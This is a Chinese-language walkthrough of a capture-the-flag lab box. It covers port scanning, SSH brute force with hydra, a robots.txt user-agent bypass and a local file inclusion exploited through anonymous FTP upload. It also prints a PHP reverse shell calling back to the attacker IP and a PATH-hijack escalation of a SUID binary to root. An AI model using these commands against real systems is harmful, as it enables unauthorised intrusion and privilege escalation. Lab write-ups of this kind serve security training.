## 总结

getwebshell → 发现`robots.txt`→ 访问需要伪造`ua`→ 突破限制得到敏感路径 → 发现文件读取 →`ftp`存在上传 →
读取FTP配置文件找到`ftp`上传路径 → 发现是文件包含 → 包含`php``反弹shell`→`getwebshell`

提 权 思 路： →`suid`发现一个自定义文件 → 发现包含`whoami`→ 自定义`whoami`篡改环境变量 → 执行自定义文件`uid`提权

## 准备工作

  * 启动VPN  
获取攻击机IP →`192.168.45.213`

![](https://image.3001.net/images/20230807/1691419733_64d1045532ee7439027f2.png!small)

  * 启动靶机  
获取目标机器IP →`192.168.190.14`

![](https://image.3001.net/images/20230807/1691419734_64d1045643e8fc89cc31b.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.190.14
    
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http
    

![](https://image.3001.net/images/20230807/1691419735_64d104574ef26bd347e00.png!small)  
`开放的端口-→21,22,80`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p21,22,80 192.168.190.14
    
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    

![](https://image.3001.net/images/20230807/1691419736_64d10458692c7f5121b71.png!small)

## 信息收集-端口测试

### 21-FTP端口的信息收集

#### 21-FTP版本版本信息

通过`Nmap`探测获得FTP的版本信息，可以大致推测FTP的配置文件位置  
探测版本为`探测版本为vsftpd 3.0.3`

    
    
    # 在linux中大概率在etc目录下
    cat /etc/vsftpd.conf
    

#### 21-FTP端口匿名登录测试(成功)

尝试匿名账号`anonymous`以及无密码进行登录测试

    
    
    # 利用ftp协议+ip进行连接测试
    ftp 192.168.190.14
    Name: anonymous
    

![](https://image.3001.net/images/20230807/1691419737_64d10459e7adad7716c04.png!small)

#### 21-FTP端口-文件GET收集

登录FTP之后利用`ls`查看存在哪些目录，翻阅的同时查看一下文件权限  
利用`GET`下载文件

    
    
    # binary 以二进制模式传输文件，保证文件完整
    ftp → binary
    # 查看目录结构
    ftp → ls -al
    # cd 查看存储的文件
    ftp → cd [file_date_name]
    

虽然发现了一个`pub`的目录，但是里面没有内容

![](https://image.3001.net/images/20230807/1691419739_64d1045b05232c1dc8068.png!small)

#### 21-FTP端口-PUT上传测试(存在)

测试是否可以利用`PUT`上传文件

    
    
    # 创建文件夹测试上传功能
    touch txt
    # put 上传文件
    ftp → put txt
    

![](https://image.3001.net/images/20230807/1691419740_64d1045cb2f4cf59b6380.png!small)

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测版本为`OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)`

    
    
    # 搜索对应脚本
    msf6 → searchsploit openssh 7.9
    

没什么脚本可以利用

![](https://image.3001.net/images/20230807/1691419742_64d1045e6c6433b05bd0b.png!small)

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    ssh root @192.168.190.14 -v
    

显示publickey、password就是支持密钥以及密码登录

![](https://image.3001.net/images/20230807/1691419743_64d1045f477ad3244207a.png!small)

#### 22-SSH手动登录尝试(无)

因为支持密码登录，尝试`root`账户的密码弱密码尝试

    
    
    ssh root @192.168.190.14 -p 22
    # 密码尝试
    password → root
    

弱密码尝试失败

![](https://image.3001.net/images/20230807/1691419744_64d1046066498570a6bd7.png!small)

#### 22-SSH弱口令爆破(静静等待)

因为支持密码登录，尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.190.14 ssh -s 22
    

挂着工具进行爆破，我们尝试后续信息收集

![](https://image.3001.net/images/20230807/1691419745_64d104617ba30980bdd50.png!small)

### 80-HTTP端口的信息收集

访问`http://192.168.190.14:80`不是`CMS`我们直接从HTML隐藏信息收集开始

![](https://image.3001.net/images/20230807/1691419752_64d10468a12b492bcfb7f.png!small)

#### 信息收集-HTML隐藏信息查看(无)

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://192.168.190.14:80
    

无什么敏感信息

![](https://image.3001.net/images/20230807/1691419754_64d1046a3e2229700cdeb.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

如果扫描发现301适当考虑 -r 2 进行递归

    
    
    dirsearch -u http://192.168.190.14:80 -x 302,403
    

![](https://image.3001.net/images/20230807/1691419756_64d1046c170e49261149a.png!small)  
因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

#### 信息收集-目录访问

##### /robots.txt类端点

访问后发现和`robots.txt`有关的都是同类型的内容

    
    
    You are not a search engine! You can't read my robots.txt!
    

![](https://image.3001.net/images/20230807/1691419757_64d1046d5a6cec1e3f9ed.png!small)  
这个涉及到君子协议，应该需要修改`ua`头  
百度查找搜索引擎的爬虫机器人头部信息，因为靶场偏向国外，主要查找的是谷歌，发现`UA`头为`Googlebot`

![](https://image.3001.net/images/20230807/1691419758_64d1046ea81a7fdf24032.png!small)  
重新通过`curl`访问

    
    
    ┌──(root㉿Kali)-[/home/bachang/Ha-natraj]
    └─# curl -s --user-agent 'GoogleBot' http://192.168.190.14:80/robots.txt
    User-agent: *
    Disallow: /secret_information/
    

得到了`secret_information`的目录

![](https://image.3001.net/images/20230807/1691419759_64d1046fb11277c50d5fe.png!small)

##### /secret_information端点

访问获得的端点，得到了一篇文章

    
    
    curl http://192.168.190.14:80/secret_information
    
    curl http://192.168.190.14:80/secret_information/
    

访问被重定向了，忘记加`/`

    
    
    DNS Zone transfer is the process where a DNS server passes a copy of part of it's database (which is called a "zone") to another DNS server. It's how you can have more than one DNS server able to answer queries about a particular zone; there is a Master DNS server, and one or more Slave DNS servers, and the slaves ask the master for a copy of the records for that zone.
    
    A basic DNS Zone Transfer Attack isn't very fancy: you just pretend you are a slave and ask the master for a copy of the zone records. And it sends you them; DNS is one of those really old-school Internet protocols that was designed when everyone on the Internet literally knew everyone else's name and address, and so servers trusted each other implicitly.
    
    It's worth stopping zone transfer attacks, as a copy of your DNS zone may reveal a lot of topological information about your internal network. In particular, if someone plans to subvert your DNS, by poisoning or spoofing it, for example, they'll find having a copy of the real data very useful.
    
    So best practice is to restrict Zone transfers. At the bare minimum, you tell the master what the IP addresses of the slaves are and not to transfer to anyone else. In more sophisticated set-ups, you sign the transfers. So the more sophisticated zone transfer attacks try and get round these controls.
    

![](https://image.3001.net/images/20230807/1691419760_64d104707d789a691e073.png!small)  
这是一篇文章

![](https://image.3001.net/images/20230807/1691419761_64d10471c0c4dfe7c1c0e.png!small)

##### /manual/index.html端点

该端点没什么收获

![](https://image.3001.net/images/20230807/1691419762_64d10472cea766381e9ec.png!small)

#### /secret_information/端点探究

文章的内容和`DNS`攻击有关，寻思着是不是要`DNS`攻击  
发现两个按钮，进行点击

![](https://image.3001.net/images/20230807/1691419763_64d10473d1a9a260eb401.png!small)  
点击了按钮之后发现传参进行了改编

    
    
    # 在这里我重启了靶场，目标IP变了
    http://192.168.178.14/secret_information/?lang=es.php
    

![](https://image.3001.net/images/20230807/1691419764_64d10474b6887010db79c.png!small)  
一遇到传参总是要进行试验的，输入`/../../`之后发现内容消失了

    
    
    http://192.168.178.14/secret_information/?lang=es.php/../../
    

![](https://image.3001.net/images/20230807/1691419766_64d104760ba04daf499dd.png!small)  
这样极有可能是读取了文件，尝试读取`/../../../etc/passwd`

    
    
    http://192.168.178.14/secret_information/?lang=es.php/../../../../etc/passwd
    

![](https://image.3001.net/images/20230807/1691419766_64d10476b28be4bb8728a.png!small)  
发现依旧是空白，不要认输，再试试绝对路径`/etc/passwd`

    
    
    http://192.168.178.14/secret_information/?lang=es.php/etc/passwd
    

![](https://image.3001.net/images/20230807/1691419767_64d1047764d5814960fee.png!small)  
看着有点怪怪，绝对路径的话应该是=后面就加，进行尝试

    
    
    http://192.168.178.14/secret_information/?lang=/etc/passwd
    

所以遇到猜测的时候要多进行尝试，绝对相对都要试验。得到账户名`tom`

![](https://image.3001.net/images/20230807/1691419768_64d104784964d9e2f979d.png!small)

#### 测试是否文件读取还是包含

之后我们要进行的测试是到底是文件读取还是文件包含，这关系到我们怎么利用漏洞  
我们要寻找可用日志

    
    
    /var/log/apache2/access.log  # apache登录日志
    /var/log/auth.log # ssh登录日志
    /var/log/lastlog  # 最后登录日志
    

虽然发现了最后登录日志存在内容，但是要`root`，我们不可控

![](https://image.3001.net/images/20230807/1691419769_64d104797bcad324ac7c0.png!small)

##### 思考

我们现有已知的服务是21、22和80，在22和80未知的情况下我们的思路有以下

  * 利用已知账号`tom`进行`ssh`密码爆破

  * 尝试读取`tom`用户下的机密文件:私钥、历史信息(如果是文件包含的话不需要)

  * 需要已知可控路径

## 漏洞利用-getwebshell

### 读取FTP文件确认文件包含

在最开始我们探测`ftp`的时候确认了版本对应的路径`/etc/vsftpd.conf`  
结合我们查看`/etc/passwd`给的提示

![](https://image.3001.net/images/20230807/1691419770_64d1047a466e8f84ebac0.png!small)  
尝试读取`ftp`的配置文件来找到上传路径，来确认是否是文件包含

    
    
    http://192.168.178.14/secret_information/?lang=/etc/vsftpd.conf
    

查找到了匿名`ftp`上传的路径`/var/ftp`

![](https://image.3001.net/images/20230807/1691419771_64d1047bb0b67dd127de2.png!small)  
这时候我们准备一个`phpinfo`的文件来确认是包含还是读取

    
    
    echo "<?php phpinfo();?>" → test.txt
    

我们在`ftp`文件夹下的`pub`文件夹中上传了一个文件

![](https://image.3001.net/images/20230807/1691419773_64d1047df3221ad1bc62c.png!small)

    
    
    http://192.168.178.14/secret_information/?lang=/var/ftp/pub/test.txt
    

访问之后发现是文件包含，可以利用文件包含写`反弹shell`

![](https://image.3001.net/images/20230807/1691419775_64d1047f62caa6a31f30d.png!small)

### FTP匿名上传+文件包含getwebshell

#### PHP反弹shell(失败)

首先准备好我们的`反弹shell`脚本，因为是`php`的脚本语言，准备`php`的`反弹shell`

    
    
    # 攻击机先开启监听
    sudo nc -lvnp 5555
    
    
    
    # 利用vim创建shell.php
    php -r '$sock=fsockopen("192.168.45.213",5555]);exec("/bin/sh -i &3 2→&3");'
    # ftp上传
    ftp→ put shell.php
    # url访问反弹shell
    http://192.168.178.14/secret_information/?lang=/var/ftp/pub/shell.php
    

在这里直接套用`php`反弹`shell`是不成功的，重新修改

![](https://image.3001.net/images/20230807/1691419776_64d1048094bb39b2208f1.png!small)  
需要用`php`脚本语言包括起来，程序才知道这是要用脚本执行

    
    
    <?php
    $sock=fsockopen("192.168.45.213",5555]);
    exec("/bin/sh -i <&3 >&3 2→&3");
    ?→
    

发现依旧尝试失败

#### 利用kali的反弹shell

    
    
    # 利用cp命令cp一个到当前文件夹并且命名为shell.php
    sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell5.php
    
    
    
    # 开启监听
    sudo nc -lvnp 5555
    

`反弹shell`配置

    
    
    # 利用grep确定修改反弹shell_ip的第49行
    grep -n "127.0.0.1" shell5.php                
    → 49:$ip = '127.0.0.1';  // CHANGE THIS
    # 同理监听端口是第50行
    grep -n "1234" shell5.php
    50:$port = 1234;       // CHANGE THIS
    # 利用sed命令替换里面的内容
    sed -i '49s/127.0.0.1/192.168.45.213/' shell5.php
    sed -i '50s/1234/5555/' shell5.php
    # 利用sed查看49与50行是否修改成功
    sed -n '49,50p' shell5.php
    
    
    
    # ftp上传
    ftp → put shell5.php
    # 访问反弹shell
    curl http://192.168.178.14/secret_information/?lang=/var/ftp/pub/shell5.php
    

成功`反弹shell`

![](https://image.3001.net/images/20230807/1691419777_64d104818bd827eb72b49.png!small)

## 内网遨游-getshell

### 交互shell

由于获取的shell交互不友好，利用python获得新的交互shell

    
    
    python -c "import pty;pty.spawn('/bin/bash')";
    

![](https://image.3001.net/images/20230807/1691419778_64d10482e519d39912a59.png!small)

### FLAG1获取

    
    
    www-data @inclusiveness:/$ find / -name local.txt 2→/dev/null
    /home/tom/local.txt
    www-data @inclusiveness:/$ cat /home/tom/local.txt
    8c5e5c2cf85adf82b513847252b80f60
    

![](https://image.3001.net/images/20230807/1691419780_64d104840f7a6196abbbb.png!small)

### 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

    
    
    # 确定发行版本
    www-data @inclusiveness:/$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Debian
    Description:    Debian GNU/Linux 10 (buster)
    Release:        10
    Codename:       buster
    

发行版本为`Debian`，不太能`overlayfs`提权

![](https://image.3001.net/images/20230807/1691419781_64d1048507d0a5904b87b.png!small)

#### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

    
    
    www-data @inclusiveness:/$ uname -a
    Linux inclusiveness 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
    

内核版本为`4.19.0`

![](https://image.3001.net/images/20230807/1691419781_64d10485e556c24ecb34a.png!small)

#### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件  
如果发现`sudo -l`有东西的话 访问`https://gtfobins.github.io`寻找

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现需要密码

![](https://image.3001.net/images/20230807/1691419782_64d10486c4d3535e3e541.png!small)

#### 列举出所有suid文件

如果发现`sudo -l`有东西的话 访问`https://gtfobins.github.io`寻找

    
    
    # -perm 文件权限
    find / -perm -u=s -type f 2→/dev/null
    /usr/bin/chsh
    /usr/bin/bwrap
    /usr/bin/gpasswd
    /usr/bin/fusermount
    /usr/bin/chfn
    /usr/bin/ntfs-3g
    /usr/bin/passwd
    /usr/bin/sudo
    /usr/bin/newgrp
    /usr/bin/mount
    /usr/bin/su
    /usr/bin/umount
    /usr/bin/pkexec
    /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/openssh/ssh-keysign
    /usr/sbin/pppd
    /home/tom/rootshell
    

里面混进了一个用户下的文件是`suid`文件

![](https://image.3001.net/images/20230807/1691419783_64d10487cc770b9df7b7e.png!small)

#### rootshell探究

首先查看内容

    
    
    cat /home/tom/rootshell
    

发现是乱码，疑似编译后

![](https://image.3001.net/images/20230807/1691419785_64d10489a6e2e8b39e52a.png!small)  
转移到用户`tom`目录下发现存在编译前的文件

![](https://image.3001.net/images/20230807/1691419787_64d1048b3d9a000a186c1.png!small)  
查看后大致知道内容

    
    
    www-data @inclusiveness:/home/tom$ cat rootshell.c
    cat rootshell.c
    #include 
    #include 
    #include 
    #include 
    
    int main() {
        printf("checking if you are tom...\n");
        FILE* f = popen("whoami", "r");
    
        char user[80];
        fgets(user, 80, f);
    
        printf("you are: %s\n", user);
        //printf("your euid is: %i\n", geteuid());
    
        if (strncmp(user, "tom", 3) == 0) {
            printf("access granted.\n");
            setuid(geteuid());
            execlp("sh", "sh", (char *) 0);
        }
    }
    

![](https://image.3001.net/images/20230807/1691419789_64d1048d0557b8d59939e.png!small)  
不过在不懂的时候，还是可以执行一下的  
会利用`whoami`命令打印我当前的权限

![](https://image.3001.net/images/20230807/1691419790_64d1048e43a748b2ec154.png!small)  
从`rootshell.c`源码里面可以看到如果是`tom`用户的话，会`set`到`root`的`shell`

    
    
    这段代码是一个简单的 C 程序，名为 `rootshell.c`。它的功能是检查当前用户是否为 “tom”，如果是，则获取权限并打开一个交互式的 shell
    

### 权限提升

### 伪造whoami

如果`rootshell`会利用`root`调用`whoami`的话  
我应该可以在当前位置创建一个假的`whoami`，篡改环境变量使得`rootshell`执行  
我需要制作一个输出为`tom`的`whoami`

    
    
    # 制作一个whoami
    echo "echo 'tom'" → whoami
    # 发现没有权限，移动到/tmp目录下
    cd /tmp
    # 重新制作
    echo "echo 'tom'" → whoami
    # 增加执行权限
    chmod +x whoami
    # 运行测试
    ./whoami
    

![](https://image.3001.net/images/20230807/1691419791_64d1048f1410a845d68fa.png!small)

### 环境变量篡改

成功输出`tom`第一部完成  
接下来我们需要让`rootshell`执行的`whoami`是我们这个，伪造环境变量

    
    
    # 哪里是whoami
    which whoami
    # 确定一下环境变量
    echo $PATH
    # 临时修改环境变量，在当前shell下优先为/tmp
    PATH=/tmp:$PATH
    # 测试
    whoami
    

现在直接`whoami`也是输出`tom`，第二步完成

![](https://image.3001.net/images/20230807/1691419792_64d1049006a952b4b7ff6.png!small)

### suid权限提升-rootshell

    
    
    # 接下来运行rootshell
    /home/tom/rootshell
    

运行之后`uid`提升为了`root`，提权成功

![](https://image.3001.net/images/20230807/1691419793_64d104910501a8b8df833.png!small)

### FLAG2获取

    
    
    # cat /root/proof.txt
    783c824707497071595a7fcc2717b23a
    

完结撒花~

![](https://image.3001.net/images/20230807/1691419794_64d104921bbca6c1afd9f.png!small)

## 反思

文件包含反弹`shell`与在内网一句话`php``反弹shell`还是有一定的区别的  
如果看到不一样的`suid`也要尝试研究一下比较好

